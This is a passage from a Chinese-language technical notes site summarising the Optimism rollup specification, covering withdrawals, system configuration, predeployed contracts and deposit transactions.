L2ToL1MessagePasser {\n    event MessagePassed(\n        uint256 indexed nonce, // this is a global nonce value for all withdrawal messages\n        address indexed sender,\n        address indexed target,\n        uint256 value,\n        uint256 gasLimit,\n        bytes data,\n        bytes32 withdrawalHash\n    );\n\n    event WithdrawerBalanceBurnt(uint256 indexed amount);\n\n    function burn() external;\n\n    function initiateWithdrawal(address _target, uint256 _gasLimit, bytes memory _data) payable external;\n\n    function messageNonce() public view returns (uint256);\n\n    function sentMessages(bytes32) view external returns (bool);\n}\n\n该MessagePassed事件包括散列并存储在映射中的所有数据sentMessages以及散列本身。\n提款时地址不会使用别名\n当合约进行存款时，发送者的地址是别名。提款则不然，提款不会修改发件人的地址。不同之处在于：\n\n在 L2 上，存款发送者的地址由操作码返回CALLER，这意味着合约无法轻易判断调用是源自 L1 还是 L2，而\nl2Sender()在L1上，通过调用合约上的函数来访问提款发送者的地址OptimismPortal 。\n\n呼叫l2Sender()消除了有关呼叫源自哪个域的任何歧义。尽管如此，开发人员需要认识到，拥有相同的地址并不意味着 L2 上的合约将与 L1 上的合约表现相同。\n乐观门户合约\nOptimism Portal 充当 Optimism L2 的入口和出口点。它是一个继承自OptimismPortal合约的合约，此外还提供了以下提现接口：\n\nWithdrawalTransaction类型\nOutputRootProof类型\n\ninterface OptimismPortal {\n\n    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);\n\n\n    function l2Sender() returns(address) external;\n\n    function proveWithdrawalTransaction(\n        Types.WithdrawalTransaction memory _tx,\n        uint256 _l2OutputIndex,\n        Types.OutputRootProof calldata _outputRootProof,\n        bytes[] calldata _withdrawalProof\n    ) external;\n\n    function finalizeWithdrawalTransaction(\n        Types.WithdrawalTransaction memory _tx\n    ) external;\n}\n\n提款验证和最终确定\n需要提供以下信息来证明并最终确定提款：\n\n提现交易数据：\n\nnonce：所提供消息的随机数。\nsender：L2 上的消息发送者地址。\ntarget：L1 上的目标地址。\nvalue：发送到目标的 ETH。\ndata：要发送到目标的数据。\ngasLimit：要转发到目标的气体。\n\n\n证明和验证数据：\n\nl2OutputIndex：L2 输出中的索引，可以在其中找到适用的输出根。\noutputRootProof``bytes32：用于导出输出根的四个值。\nwithdrawalProof：L2ToL1MessagePasser 合约中给定提款的包含证明。\n\n\n\n这些输入必须满足以下条件：\n\n必须l2OutputIndex是 L2 输出中包含适用输出根的索引。\nL2OutputOracle.getL2Output(l2OutputIndex)返回一个非零值OutputProposal。\n值的 keccak256 哈希值outputRootProof等于outputRoot.\n这withdrawalProof是一个有效的包含证明，证明提款交易数据的哈希值包含在 L2 上的 L2ToL1MessagePasser 合约的存储中。\n\n安全考虑\n提款验证的关键属性\n\n不应“双花”提款，即。在 L1 上中继与 L2 上发起的消息不对应的撤回。作为参考，请参阅Polygon 上发现的此类漏洞的文章。\n对于 L2 上发起的每次提款（即具有唯一的messageNonce()），必须满足以下属性：\n\n除非提款的outputRoot已经改变，否则只能证明一次提款。\n应该只能完成一次提款。\n应该不可能在任何字段被修改的情况下中继消息，即。\n\n修改该sender字段将启用“欺骗”攻击。\n修改target、data或value字段将使攻击者能够危险地改变提款的预期结果。\n修改gasLimit可能会使中继的成本过高，或者允许中继器导致target.\n\n\n\n\n\n处理已成功验证但中继失败的消息\n如果合约中中继调用的执行失败target，不幸的是无法确定它是否“应该”失败，以及它是否应该“可重放”。因此，为了最大限度地降低复杂性，我们没有提供任何重播功能，如果需要，可以在外部公用事业合同中实现。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-系统配置":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-系统配置","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-系统配置.md","title":"op-系统配置","links":[],"tags":[],"content":"系统配置\n目录\n\n系统配置内容（版本0）\n\nbatcherHash( bytes32)\noverhead和scalar( uint256,uint256)\ngasLimit( uint64)\nunsafeBlockSigner( address)\n\n\n编写系统配置\n读取系统配置\n\n这SystemConfig是 L1 上的合约，可以将汇总配置更改作为日志事件发出。汇总块派生过程会获取这些日志事件并应用更改。\n系统配置内容（版本0）\n系统配置合约版本0定义了以下参数：\nbatcherHash( bytes32)\n当前授权批处理发送者的版本化哈希，用于作为批处理提交者轮换密钥。第一个字节标识版本。\n版本0将当前批次提交者以太坊地址 ( bytes20) 嵌入版本化哈希的最后 20 个字节中。\n将来，此版本化哈希可能会成为对更广泛配置的承诺，以实现更广泛的冗余和/或轮换配置。\noverhead和scalar( uint256,uint256)\nL1 费用参数，也称为 Gas Price Oracle (GPO) 参数，会同时更新，并将新的 L1 成本应用于 L2 交易。\ngasLimit( uint64)\nL2 块的 Gas 限制通过系统配置进行配置。L2 气体限制的更改完全应用于引入更改的 L1 源的第一个 L2 块，而不是像 L1 块的限制更新中所示的针对目标的 1/1024 调整。\nunsafeBlockSigner( address)\n区块在 L1 上可用之前，会在 p2p 网络中传播。为了防止 p2p 层上的拒绝服务，这些不安全块必须使用特定密钥进行签名，才能被接受为“规范”不安全块。该键对应的地址是unsafeBlockSigner. 为了确保它的值可以通过存储证明以独立于存储布局的方式获取，它被存储在对应于 的特殊存储槽中 keccak256(&quot;systemconfig.unsafeblocksigner&quot;)。\n与其他值不同，unsafeBlockSigner唯一的值根据区块链策略运行。它不是共识级别参数。\n编写系统配置\n合约SystemConfig对所有写入合约功能进行认证，配置管理可以配置为任何类型的以太坊账户或合约。\n写入时，会发出一个事件，以便 L2 系统拾取更改，并且新写入的配置变量的副本保留在 L1 状态中，以便通过 L1 合约进行读取。\n读取系统配置\nRollup 节点通过根据其过去的 L2 链查找起点来初始化其派生过程：\n\n当从 L2 创世开始时，将从汇总链配置中检索初始系统配置。\n当从现有的 L2 链启动时，先前包含的 L1 块被确定为派生起点，因此可以从引用 L1 块作为 L1 起源的最后一个 L2 块中检索系统配置：\n\nbatcherHash，overhead并scalar从 L1 区块信息交易中检索。\ngasLimit从 L2 块头中检索。\n还可以从 L2 块的其他内容（例如标头）检索其他未来变量。\n\n\n\n在为给定的 L1 起始输入准备好初始系统配置后，系统配置将通过处理来自每个新 L1 块的所有接收来更新。\n对包含的日志事件进行过滤和处理，如下所示：\n\n\n日志事件合约地址必须与汇总SystemConfig部署匹配\n\n\n第一个日志事件主题必须与 ABI 哈希匹配ConfigUpdate(uint256,uint8,bytes)\n\n\n第二个主题决定版本。未知版本是严重的推导错误。\n\n\n第三个主题确定更新的类型。未知类型是严重的推导错误。\n\n\n剩余的事件数据是不透明的，编码为ABI字节（即包括偏移量和长度数据），并对配置更新进行编码。版本中\n0\n\n支持以下类型：\n\ntype 0：batcherHash覆盖，作为bytes32有效负载。\n输入1:overhead并scalar覆盖，作为两个打包uint256条目。\ntype 2：gasLimit覆盖，作为uint64有效负载。\ntype 3：unsafeBlockSigner覆盖，作为address有效负载。\n\n\n\n请注意，各个推导阶段可能正在处理不同的 L1 块，因此应维护各个系统配置副本，并在该阶段遍历到下一个 L1 块时应用基于事件的更改。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-预部署":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/op-预部署","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/op-预部署.md","title":"op-预部署","links":[],"tags":[],"content":"预部署\n目录\n\n概述\n遗留消息传递器\nL2ToL1消息传递器\n部署者白名单\n旧版ERC20ETH\n韦斯9\nL2跨域信使\nL2标准桥接器\nL1区块编号\n天然气价格甲骨文\nL1区块\n代理管理\n排序器费用库\nOptimismMintableERC20Factory\nOptimismMintableERC721Factory\n基本费用保险库\nL1收费金库\n\n概述\n预部署的智能合约存在于创世状态下预先确定的地址的 Optimism 上。它们与预编译类似，但直接在 EVM 中运行，而不是在 EVM 外部运行本机代码。\n使用预部署而不是预编译，可以更轻松地实现多客户端，并允许与安全帽/铸造厂网络分叉进行更多集成。\n预部署地址存在于 1 字节命名空间中0x42000000000000000000000000000000000000xx。代理在每个可能的预部署地址处设置，除了 GovernanceToken和ProxyAdmin。\n预LegacyERC20ETH部署位于一个特殊地址0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000 ，并且该帐户没有部署代理。\n下表包括每个预部署。系统版本指示何时引入预部署。可能的值为Legacy 或Bedrock。不应使用已弃用的合同。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n姓名地址介绍已弃用代理遗留消息传递器0x4200000000000000000000000000000000000000遗产是的是的部署者白名单0x4200000000000000000000000000000000000002遗产是的是的旧版ERC20ETH0xDeadDeAddeAddEAddeadDEaDDDEAdDeaDDeAD0000遗产是的不韦斯90x4200000000000000000000000000000000000006遗产不不L2跨域信使0x4200000000000000000000000000000000000007遗产不是的L2标准桥接器0x4200000000000000000000000000000000000010遗产不是的排序器费用库0x4200000000000000000000000000000000000011遗产不是的OptimismMintableERC20Factory0x4200000000000000000000000000000000000012遗产不是的L1区块编号0x4200000000000000000000000000000000000013遗产是的是的天然气价格甲骨文0x420000000000000000000000000000000000000F遗产不是的治理代币0x4200000000000000000000000000000000000042遗产不不L1区块0x4200000000000000000000000000000000000015基岩不是的L2ToL1消息传递器0x4200000000000000000000000000000000000016基岩不是的L2ERC721桥0x4200000000000000000000000000000000000014遗产不是的OptimismMintableERC721Factory0x4200000000000000000000000000000000000017基岩不是的代理管理0x4200000000000000000000000000000000000018基岩不是的基本费用保险库0x4200000000000000000000000000000000000019基岩不是的L1收费金库0x420000000000000000000000000000000000001a基岩不是的\n遗留消息传递器\n执行\n地址：0x4200000000000000000000000000000000000000\n该LegacyMessagePasser合约存储了基岩升级之前提款交易的承诺。提交提款交易的特定存储槽的默克尔证明被用作 L1 上提款交易的一部分。包含存储槽的预期帐户被硬编码到 L1 逻辑中。基岩升级后，L2ToL1MessagePasser改为使用。在基岩之后，将不再支持最终从该合同中撤回，并且仅允许可能依赖于它的替代桥梁。该合约不会将调用转发到 ，L2ToL1MessagePasser并且在通过系统进行提款的情况下调用它被视为无操作CrossDomainMessenger 。\n任何尚未最终确定的待处理提款都会作为 L2ToL1MessagePasser升级的一部分迁移到 ，以便仍可以最终确定。\nL2ToL1消息传递器\n执行\n地址：0x4200000000000000000000000000000000000016\n本店L2ToL1MessagePasser承诺提现交易。当用户在 L1 上提交提款交易时，他们提供了一个证明，证明他们在 L2 上提款的交易位于sentMessages 该合约的映射中。\n任何提取的 ETH 都会累积到 L2 上的此合约中，并且可以通过调用该burn()函数而无需许可地从 L2 供应中删除。\n部署者白名单\n执行\n地址：0x4200000000000000000000000000000000000002\n这DeployerWhitelist是一种预部署，用于在 Optimism 的初始阶段提供额外的安全性。它之前定义了允许将合约部署到网络的帐户。\n随后启用了任意合约部署，并且无法关闭。在遗留系统中，该合同被挂钩CREATE并 CREATE2确保部署者被列入允许名单。\n在基岩系统中，该合约将不再用作 CREATE代码路径的一部分。\n该合约已被弃用，应避免使用。\n旧版ERC20ETH\n执行\n地址：0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000\n预LegacyERC20ETH部署代表基岩升级之前系统中的所有以太币。所有 ETH 均表示为 ERC20 代币，用户可以选择使用 ERC20 接口或原生 ETH 接口。\n升级到基岩版会将所有以太币从该合约中迁移出来，并将其移至其本机表示形式。该合约中的所有有状态方法都将在基岩升级后恢复。\n该合约已被弃用，应避免使用。\n韦斯9\n执行\n地址：0x4200000000000000000000000000000000000006\nWETH9是 Wrapped Ether on Optimism 的标准实现。它是一种常用的合约，并被放置为预部署，以便它位于基于 Optimism 的网络中的确定性地址。\nL2跨域信使\n执行\n地址：0x4200000000000000000000000000000000000007\n与L2CrossDomainMessenger直接调用L2ToL1MessagePasser. 它维护已中继到 L2 的 L1 消息的映射，以防止重放攻击，并且如果 L1 到 L2 事务在 L2 上恢复，则还允许重放。\n对 L1 上的任何调用L1CrossDomainMessenger都会进行序列化，以便它们通过L2CrossDomainMessengerL2 上的。\n该relayMessage函数从远程域执行事务，同时该sendMessage函数通过远程域的函数发送要在远程域上执行的事务relayMessage。\nL2标准桥接器\n执行\n地址：0x4200000000000000000000000000000000000010\n这L2StandardBridge是一个建立在 之上的更高级别的 API L2CrossDomainMessenger，它提供了跨域发送 ETH 或 ERC20 代币的标准接口。\n要将代币从 L1 存入 L2，需要L1StandardBridge锁定代币并向其发送跨域消息，L2StandardBridge然后将代币铸造到指定帐户。\n要将代币从 L2 提取到 L1，用户将在 L2 上销毁代币，并向 L2 L2StandardBridge发送一条消息，该消息L1StandardBridge将解锁底层代币并将其转移到指定账户。\n可OptimismMintableERC20Factory用于在远程域上创建 ERC20 代币合约，该合约映射到本地域上的 ERC20 代币合约，其中代币可以存入远程域。它部署了一个 OptimismMintableERC20具有与 StandardBridge.\n该合约还可以部署在 L1 上，以允许将 L2 原生代币提取到 L1。\nL1区块编号\n执行\n地址：0x4200000000000000000000000000000000000013\n返回L1BlockNumber最后一个已知的 L1 块号。L1Block该合约是在遗留系统中引入的，并且应该通过在后台调用该合约来向后兼容。\n建议使用L1Block合约在L2上获取L1的信息。\n天然气价格甲骨文\n执行\n地址：0x420000000000000000000000000000000000000F\n在遗留系统中，这GasPriceOracle是一个经过许可的合约，由链外参与者推动 L1 基本费和 L2 天然气价格。链下参与者观察 L1 区块头以获得 L1 基本费用以及 L2 上的 Gas 使用情况，以根据拥塞控制算法计算 L2 Gas 价格。\n在 Bedrock 之后，它GasPriceOracle不再是一个许可合约，其存在只是为了保留用于链下 Gas 估算的 API。该函数getL1Fee(bytes)接受未签名的 RLP 交易，并将返回费用的 L1 部分。该费用用于支付使用 L1 作为数据可用性层的费用，并且应添加到费用的 L2 部分（用于支付执行费用），以计算总交易费用。\n用于计算费用的 L2 部分的值为：\n\n标量\n高架\n小数点\n\n基岩升级后，这些值改为由 SystemConfigL2 上的合约管理。和scalar值每个块overhead都会发送到合约，并且该值已硬编码为 6。L1Block``decimals\nL1区块\n执行\n地址：0x4200000000000000000000000000000000000015\nL1Block是在 Bedrock 中引入的，负责维护 L2 中的 L1 上下文。这允许在 L2 中访问 L1 状态。\n代理管理\n代理管理 地址：0x4200000000000000000000000000000000000018\n是ProxyAdmin预部署时设置的所有代理合约的所有者。它本身位于代理后面。所有者ProxyAdmin将能够升级任何其他预部署合同。\n排序器费用库\n执行\n地址：0x4200000000000000000000000000000000000011\n累积SequencerFeeVault所有交易优先权费用，其值为 block.coinbase。当该账户中积累了足够的费用时，可以将其提取到不可变的 L1 地址。\n要更改提取费用的 L1 地址，必须通过更改其代理的实现密钥来升级合约。\nOptimismMintableERC20Factory\n执行\n地址：0x4200000000000000000000000000000000000012\n负责OptimismMintableERC20Factory在 L2 上创建 ERC20 合约，可用于存入原生 L1 代币。StandardBridge这些 ERC20 合约可以无需许可地创建，并实现仅处理存款和取款所需的接口。\n创建的每个 ERC20 合约都OptimismMintableERC20Factory允许铸造L2StandardBridge和销毁代币，具体取决于用户是从 L1 存款到 L2 还是从 L2 取款到 L1。\nOptimismMintableERC721Factory\n执行\n地址：0x4200000000000000000000000000000000000017\n负责OptimismMintableERC721Factory在 L2 上创建 ERC721 合约，可用于将原生 L1 NFT 存入其中。\n基本费用保险库\n执行\n地址：0x4200000000000000000000000000000000000019\n预BaseFeeVault部署在 L2 上接收基本费用。L2 上的基本费用不会像 L1 上那样被销毁。一旦合约收到一定数量的费用，ETH 就可以提取到 L1 上的不可变地址。\nL1收费金库\n执行\n地址：0x420000000000000000000000000000000000001a\n预L1FeeVault部署接收交易费用的 L1 部分。一旦合约收到一定数量的费用，ETH 就可以提取到 L1 上的不可变地址。"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism介绍篇":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism介绍篇","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/optimism介绍篇.md","title":"optimism介绍篇","links":[],"tags":[],"content":"Optimism 是一个 EVM 等效的乐观汇总协议，旨在扩展以太坊，同时保持与现有以太坊基础设施的最大兼容性。本文档概述了协议，为规范的其余部分提供上下文。\n功能\n扩展性\n扩展以太坊意味着增加以太坊网络可以处理的有用交易的数量。以太坊有限的资源，特别是带宽、计算和存储，限制了网络上可以处理的交易数量。在这三种资源中，计算和存储是目前最显着的瓶颈。这些瓶颈限制了交易的供应，导致极高的费用。可以通过更好地利用带宽、计算和存储来实现扩展以太坊和降低费用。\n什么是乐观rollup\nOptimistic rollup 是一种第 2 层可扩展性技术，可在不牺牲安全性或分散性的情况下增加以太坊的计算和存储容量。交易数据在链上提交但在链下执行。如果链下执行出现错误，可以在链上提交错误证明来纠正错误，保护用户资金。同样，除非有争议，否则你不会上法庭，除非出现错误，否则你不会在链上执行交易。\nEVM 等效\nEVM Equivalence 完全符合以太坊黄皮书描述的状态转换函数，协议的正式定义。通过在 EVM 等效汇总中符合以太坊标准，智能合约开发人员可以编写一次并部署到任何地方。\n网络参与者\nusers, sequencers, and verifiers.\n\n\nuser：\n\n通过将数据发送到以太坊主网上的合约，在 L2 上存入或提取任意交易。\n通过将交易发送到sequencer，在第 2 层使用 EVM 智能合约。\n使用网络验证者提供的区块浏览器查看交易状态。\n\nSequencer:\nSequencer是主要的块生产者。可能有一个或多个使用共识协议的Sequencer。对于 1.0.0，只有一个排序器（目前在 Optimism Foundation 的监督下运行）。通常，规范可能会使用“定序器”作为由多个定序器操作的共识协议的替代术语。\n\n接受用户链下交易（L2）\n观察链上交易（主要是来自 L1 的存款事件）\n将两种交易合并到具有特定顺序的 L2 块中。\n通过将两个东西作为calldata提交给 L1，将合并的 L2 块传播到 L1：\n\n在步骤 1 中接受的pending链下交易。\n关于链上交易顺序的足够信息，以成功重建步骤 3 中的块，完全通过观察 L1\n\n\n\nSequencer还提供早在步骤 3. 中访问块数据的权限，以便用户可以选择在 L1 确认之前访问实时状态。\nVerifiers:\n\n向用户提供rollup数据；和\n验证rollup完整性并争论无效断言。\n\n为了让网络保持安全，必须至少有一个诚实的验证者能够验证rollup链的完整性并为用户提供区块链数据。\n关键交互图\n下图演示了在关键用户交互期间如何使用协议组件，以便在深入研究任何特定组件规范时提供上下文\n存钱和发送交易：\n用户通常会通过从 L1 存入 ETH 来开始他们的 L2 旅程。一旦他们有 ETH 来支付费用，他们就会开始在 L2 上发送交易。下图演示了这种交互以及所有已使用或应该使用的关键 Optimism 组件：\n\n这个图中涉及到的组件链接\n\n\nRollup Node\n\n\nExecution Engine\n\n\nL2 Output Oracle\n\n\nL2 Output Submitter\n\n\n提款：\n与存款一样重要的是，用户可以从rollup中退出是至关重要的。提款由 L2 上的正常交易发起，但在争议期结束后使用 L1 上的交易完成。\n\n这个图中涉及到的组件链接\n\nL2 Output Oracle\n"},"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism存款":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism-spec分析/optimism存款","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/optimism spec分析/optimism存款.md","title":"optimism存款","links":[],"tags":[],"content":"存款\n存入交易，也称为存款，是在L1上发起并在L2上执行的交易。本文件概述了一种新的存款交易类型。它还描述了如何在 L1 上发起存款，以及 L2 上的授权和验证条件。\n词汇注释：存入交易特指L2交易，而 存款可以指各个阶段的交易（例如存入L1时）。\n目录\n\n充值交易类型\n\n源哈希计算\n充值交易种类\n存入交易的验证和授权\n执行\n\n随机数处理\n\n\n\n\n存款收据\nL1属性充值交易\nL2 上的特殊账户\n\nL1 属性存款人账户\nL1属性预部署合约\n\nL1属性预部署合约：参考实现\n\n\n\n\n用户存入交易\n\n存款合约\n\n地址别名\n存款合约实施：乐观门户\n\n\n\n\n\n充值交易类型\n存入交易与现有交易类型有以下显着区别：\n\n它们源自第 1 层块，并且必须作为协议的一部分包含在内。\n它们不包括签名验证（请参阅用户存入交易 了解原理）。\n他们在 L1 上购买 L2 Gas，因此 L2 Gas 不可退还。\n\n我们定义了一个新的EIP-2718兼容交易类型，其前缀0x7E代表存款交易。\n存款具有以下字段（rlp 按照它们在此处出现的顺序进行编码）：\n\n\nbytes32 sourceHash：源哈希，唯一标识存款的来源。\n\n\naddress from：发件人帐户的地址。\n\n\naddress to：接收者帐户的地址，如果存入的交易是合约创建，则为空（零长度）地址。\n\n\nuint256 mint：在 L2 上铸造的 ETH 价值。\n\n\nuint256 value：发送到接收者账户的 ETH 值。\n\n\nuint64 gas：L2 交易的 Gas 限制。\n\n\nbool isSystemTx\n\n：如果为 true，则交易不会与 L2 区块气池交互。\n\nfalse注意：从 Regolith 升级开始，布尔值被禁用（强制为）。\n\n\n\nbytes data：通话数据。\n\n\n与EIP-155交易相比，此交易类型：\n\n\n不包括 a\nnonce\n\n，因为它是由 标识的\nsourceHash\n\n。API 响应仍然包含一个\nnonce\n\n属性：\n\n在风化层之前：nonce始终是0\n对于Regolith：nonce设置为depositNonce相应交易收据的属性。\n\n\n\n不包含签名信息，并from明确地址。API 响应包含归零签名v, r,s值以实现向后兼容。\n\n\n包括新的sourceHash、from、mint和isSystemTx属性。API 响应包含这些作为附加字段。\n\n\n我们选择是0x7E因为当前允许交易类型标识符达到0x7F。选择高标识符可以最大限度地降低该标识符将来被 L1 链上的另一种交易类型占用的风险。我们不会选择0x7F它自己，以防它被用于可变长度编码方案。\n源哈希计算\n存款交易的sourceHash是根据来源计算的：\n\n用户存入： keccak256(bytes32(uint256(0)), keccak256(l1BlockHash, bytes32(uint256(l1LogIndex)))). 其中l1BlockHash、 和l1LogIndexall 指的是L1上包含充值日志事件。 l1LogIndex是该区块的日志事件组合列表中的存款事件日志的索引。\n存入L1属性： keccak256(bytes32(uint256(1)), keccak256(l1BlockHash, bytes32(uint256(seqNumber))))。其中l1BlockHash指的是存放信息属性的L1块哈希。且seqNumber = l2BlockNum - l2EpochStartBlockNum，其中l2BlockNum是存款 tx 包含在 L2 中的 L2 区块号，l2EpochStartBlockNum是该纪元中第一个 L2 区块的 L2 区块号。\n\n如果没有sourceHash存款，两个不同的存款交易可能具有相同的哈希值。\n外部keccak256对域中的实际唯一标识信息进行哈希处理，以避免不同类型的源之间的冲突。\n我们不使用发送者的随机数来确保唯一性，因为这需要 在块派生期间从执行引擎读取额外的 L2 EVM 状态。\n充值交易种类\n虽然我们只定义了一种新的交易类型，但我们可以根据两种存入交易在 L2 区块中的定位来区分它们：\n\n第一个交易必须是L1 属性存入交易，后面是\n提交到 L1 上的存款馈送合约的一组零个或多个用户存款交易OptimismPortal（称为）。用户存入的交易仅存在于 L2 纪元的第一个区块中。\n\n我们仅定义一个新的交易类型，以便最大限度地减少对 L1 客户端软件的修改以及总体复杂性。\n存入交易的验证和授权\n如上所述，存入的交易类型不包括用于验证的签名。相反，授权是由L2 链派生过程处理的，正确应用时，只会派生出具有L1 存款合约from日志证明的地址的交易。\n执行\n为了执行存入交易：\n首先，账户余额from必须增加 的金额mint。这是无条件的，并且不会在存款失败时恢复。\n然后，根据交易的属性初始化存入交易的执行环境，其方式与 EIP-155 交易完全相同。\n存款交易的处理方式与类型 3 (EIP-1559) 交易完全相同，但以下情况除外：\n\n没有验证任何费用字段：押金没有任何费用，因为它支付了 L1 上的 Gas 费用。\n未验证任何nonce字段：存款没有任何字段，它由其唯一标识sourceHash。\n不处理访问列表：存款没有访问列表，因此会像访问列表为空一样进行处理。\n不检查是否from是外部所有者账户 (EOA)：通过 L1 地址屏蔽确保存款不是 EAO，这可能会在未来的 L1 合约部署中发生变化，例如启用类似账户抽象的机制。\n风化层升级前：\n\n执行输出显示非标准气体使用情况：\n\n如果isSystemTx为 false：执行输出表明它使用了gasLimitgas。\n如果isSystemTx为真：执行输出表明它使用了0gas。\n\n\n\n\n天然气不会以 ETH 形式退还。（要么不退还，要么利用押金的 Gas 价格为 的事实0）\n不收取交易优先费。不向集体费用接收者支付任何费用。\n不收取 L1 成本费用，因为押金来自 L1，无需作为数据提交回 L1。\n不收取基本费用。基本费用总额核算不变。\n\n请注意，这包括像常规交易一样的合约部署行为，并且 Gas 计量是相同的（除了上面与费用相关的更改之外），包括内在 Gas 的计量。\nEVM 执行发出的任何非 EVM 状态转换错误都会以特殊方式处理：\n\n它转化为EVM错误：即存款将始终被包含在内，但如果遇到非EVM状态转换错误，其收据将指示失败，例如由于帐户不足而无法转移指定数量的 valueETH -平衡。\n在存款的铸造部分之后，世界状态将回滚到 EVM 处理开始时的状态。\nnonce世界状态中的 of增加from1，使错误相当于本机 EVM 故障。请注意，之前的nonce增量可能在 EVM 处理期间发生，但这将首先回滚。\n\n最后，经过上述处理后，执行后处理的运行方式相同：即气池和收据的处理与常规交易相同。然而，从 Regolith 升级开始，存款交易的接收会增加一个附加值 depositNonce，存储EVM 处理之前注册的发送者nonce的值。from\n请注意，执行输出所述使用的 Gas 会从 Gas 池中减去，但此执行输出值在 Regolith 升级之前具有特殊的边缘情况。\n应用程序开发人员请注意：因为CALLER和ORIGIN被设置为from，所以在存款交易期间使用检查的语义tx.origin == msg.sender将无法确定调用者是否是 EOA。相反，该支票只能用于识别 L2 存款交易中的第一次调用。然而，此检查仍然满足开发人员使用此检查来确保在CALLER调用之前和之后无法执行代码的常见情况。\n随机数处理\n尽管缺乏签名验证，我们仍然from在执行存款交易时增加帐户的随机数。在仅存款汇总的情况下，这对于交易排序或防止重放来说不是必需的，但它与合约创建期间随机数的使用保持了一致性。它还可以简化与下游工具（例如钱包和区块浏览器）的集成。\n存款收据\n交易收据使用符合EIP-2718的标准类型。存款交易收据类型与常规收据相同，但扩展了一个可选depositNonce字段。\nRLP 编码的共识强制字段是：\n\n\npostStateOrStatus（标准）：这包含事务状态，请参阅EIP-658。\n\n\ncumulativeGasUsed\n\n（标准）：迄今为止区块中使用的天然气，包括本次交易。\n\nCumulativeGasUsed实际使用的gas是根据与之前交易的差异得出的。\n从 Regolith 开始，这说明了存款的实际 Gas 使用量，就像常规交易一样。\n\n\n\nbloom（标准）：事务日志的布隆过滤器。\n\n\nlogs（标准）：记录 EVM 处理发出的事件。\n\n\ndepositNonce\n\n（唯一扩展）：可选字段。存款交易会保留执行期间使用的随机数。\n\n在 Regolith 之前，depositNonce必须始终忽略此字段。\n对于风化层，depositNonce必须始终包含该字段。\n\n\n\n从 Regolith 开始，收据 API 响应利用收据更改来获得更准确的响应数据：\n\n包含depositNonce在 API 响应中的收据 JSON 数据中\n对于合约部署（当 时to == null），depositNonce有助于导出正确的contractAddress元数据，而不是假设随机数为零。\n这cumulativeGasUsed说明了 EVM 处理中计量的实际气体使用量。\n\nL1属性充值交易\nL1属性押金交易是发送到L1属性预部署合约的押金交易。\n该交易必须具有以下值：\n\nfrom是（ L1属性存款人账户0xdeaddeaddeaddeaddeaddeaddeaddeaddead0001的地址 ）\nto是（ L1属性预部署合约0x4200000000000000000000000000000000000015的地址）。\nmint是0\nvalue是0\ngasLimit设置为 150,000,000。\nisSystemTx设置为true.\ndata是对L1 属性预部署合约函数 的ABI编码调用，具有与相应 L1 块关联的正确值（参见 参考实现）。setL1BlockValues()\n\n如果风化层升级处于活动状态，某些字段将被覆盖：\n\ngasLimit设置为 1,000,000\nisSystemTx被设定为false\n\n系统发起的 L1 属性交易不会为其分配的任何 ETH 收取费用gasLimit，因为它实际上是状态转换处理的一部分。\nL2 上的特殊账户\nL1属性存款交易涉及两个特殊目的账户：\n\nL1属性存款人账户\nL1属性预部署合约\n\nL1 属性存款人账户\n存款人账户是一个没有已知私钥的EOA 。它有地址 0xdeaddeaddeaddeaddeaddeaddeaddeaddead0001。 在执行 L1 属性存入交易期间，其值由CALLER和操作码返回。ORIGIN\nL1属性预部署合约\nL2 上地址 处的预部署合约0x4200000000000000000000000000000000000015，保存存储中相应 L1 区块中的某些区块变量，以便在执行后续存入交易时可以访问它们。\n预部署存储以下值：\n\n\nL1块属性：\n\nnumber( uint64)\ntimestamp( uint64)\nbasefee( uint256)\nhash( bytes32)\n\n\n\nsequenceNumber( uint64)：这等于相对于纪元开始的 L2 区块编号，即 L1 属性上次更改的 L2 区块到 L2 区块高度的距离，并在新纪元开始时重置为 0。\n\n\n与 L1 块相关的系统配置，请参阅\n系统配置规范\n：\n\nbatcherHash( bytes32)：对当前正在运行的批次提交者的版本化承诺。\noverhead( uint256)：应用于此 L2 区块中交易的 L1 成本计算的 L1 费用开销。\nscalar( uint256)：应用于此 L2 区块中交易的 L1 成本计算的 L1 费用标量。\n\n\n\n该合约实施授权方案，使其仅接受来自存款人账户的状态更改调用。\n合约具有如下solidity接口，可以按照 合约ABI规范进行交互。\nL1属性预部署合约：参考实现\nL1 属性预部署合约的参考实现可以在L1Block.sol中找到。\npnpm build在目录中运行后packages/contracts，要添加到创世文件的字节码将位于deployedBytecode构建工件文件的字段 中，位置为/packages/contracts/artifacts/contracts/L2/L1Block.sol/L1Block.json.\n用户存入交易\n用户存入交易是由L2链衍生过程 生成的存入交易。每笔用户充值交易的内容由L1上的充值合约发出的 相应事件决定。TransactionDeposited\n\n\nfrom与发出的值没有变化（尽管它可能已转换为OptimismPortal存款馈送合约中的别名）。\n\n\nto\n\n是任意20字节地址（包括零地址）\n\n如果创建合约（参见isCreation），该地址设置为null。\n\n\n\nmint设置为发射值。\n\n\nvalue设置为发射值。\n\n\ngaslimit与发射值相比没有变化。它必须至少为 